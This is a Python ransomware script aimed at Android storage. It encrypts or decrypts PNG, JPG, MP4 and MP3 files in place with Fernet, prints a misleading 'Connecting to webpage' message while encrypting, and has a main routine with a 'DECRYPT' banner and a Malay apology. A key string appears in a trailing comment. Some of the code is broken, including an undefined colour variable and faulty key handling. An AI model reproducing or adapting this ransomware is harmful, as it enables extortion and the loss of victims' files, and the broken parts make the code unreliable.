import os
import random
import socket
import smtplib
import shutil
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from os.path import expanduser
from cryptography.fernet import Fernet
import requests
from bs4 import BeautifulSoup

kaler ="\033[1;32;40m"
testeron="/storage/emulated/0/"
red="\033[2;36;41m"
tester="/sdcard/image"
cyan="\033[1;36;40m"
purple="\033[1;35;40m"
r3d="\033[1;31;40m"
green_purple="\033[1;32;45m"
end='\033[0m'

class Ransomware(object):
    def __init__(self):
        self.key = None                 # Key to encrypt the files
        self.cryptor = None             # Object that does the actual encryption
        self.file_ext_targets = ['png','mp4','jpg','jpeg','mp3'] # Type of files, you're going to encrypt 

    
              
                 
    def read_key(self, keyfile_name):
        self.key=keyfile_name
        self.cryptor=Fernet(self.key)
        # Read the key for decryption
 
  
    
    def write_key(self, keyfile_name):
        # Saves the decryption key to file
        print(self.key)
        with open(keyfile_name, "wb") as f:
            f.write(self.key)


    def crypt_root(self, root_dir, encrypted=False):
        open("7","w").write("ayam")
        # Recursively encrypt or decrypt files from root directory 
        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)
                # Pass if no target files is present in current folder
                if not abs_file_path.split(".")[-1] in self.file_ext_targets:
                    continue
                self.crypt_file(abs_file_path, encrypted=encrypted)
    

    def crypt_file(self, file_path, encrypted=False):
        # Encrypt & Decrypt function
        with open(file_path, "rb+") as f:
            _data = f.read()
            if not encrypted:
                # Encrypt
                print()
                print(yellow+"Connecting to webpage please wait....."+end)
                data = self.cryptor.encrypt(_data)
                print(yellow+"please wait!..."+end)
            else:
                # Decrypt
                data = self.cryptor.decrypt(_data)
                print(kaler+"BERHASIL"+end)
            f.seek(0)
            f.write(data)
            
   

if __name__ == "__main__":
	

   def rahsia():
   	print(cyan+"""
Kepada sesiapa yang menggunakan script ini saya ingin meminta maaf sekali lagi kerana telah menyusahkan anda!. Tolong maafkan saya jika script ini tidak bertindak sesuai kemahuan anda. Tapi jangan risau saya selaku pembuat script ini telah bertanggungjawab untuk melakukan sehabis baik!!"""+end)
   	print("")
   	time.sleep(10)
   	print(r3d+"""
.__ .___ __ .__ .   ,.__ .___.
|  \[__ /  `[__) \./ [__)  |  
|__/[___\__.|  \  |  |     |  
                              
                                   
		"""+end)
   	ransom=Ransomware()
   	kunci=input("MASUKKAN KUNCI :")
   	ransom.read_key(kunci)
   	with open("list.txt","r") as kdf:
   			for list in kdf:
   				ransom.crypt_root(list,encrypted=True)
   				print("wait")
   				
   	
		

#05-mEwQ3Sa0x2bttQr_S2YgyVXBW8SXeBentRjEO16Y=
rahsia()